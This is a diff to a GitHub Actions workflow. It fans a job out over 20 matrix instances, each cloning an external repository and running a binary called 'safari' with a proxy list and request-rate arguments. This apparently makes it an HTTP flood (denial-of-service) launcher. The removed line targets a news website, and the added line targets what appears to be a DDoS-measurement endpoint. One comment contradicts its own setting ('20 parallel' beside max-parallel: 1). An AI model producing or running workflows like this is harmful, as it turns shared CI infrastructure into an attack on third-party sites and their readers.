@@ -11,9 +11,10 @@ jobs:
   run-script:
     runs-on: ubuntu-24.04
     strategy:
-      fail-fast: false
+      max-parallel: 1  # Limits to 20 parallel instances
+      fail-fast: false   # Continue even if some instances fail
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,20]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
     - name: Checkout code
@@ -24,5 +25,7 @@ jobs:
         git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
         cd cuddly-octo-bassoon
         chmod +x safari
-        ./safari    https://www.rappler.com/latest/ 400 10000 8000 proxies.txt --cdn  --raw 
-    
+        ./safari https://c1.dstatbot.win/npRurOot 400 10000 8000 proxies.txt --cdn --raw
+      env:
+        INSTANCE_NUMBER: ${{ matrix.instance }}
+        TOTAL_INSTANCES: 20
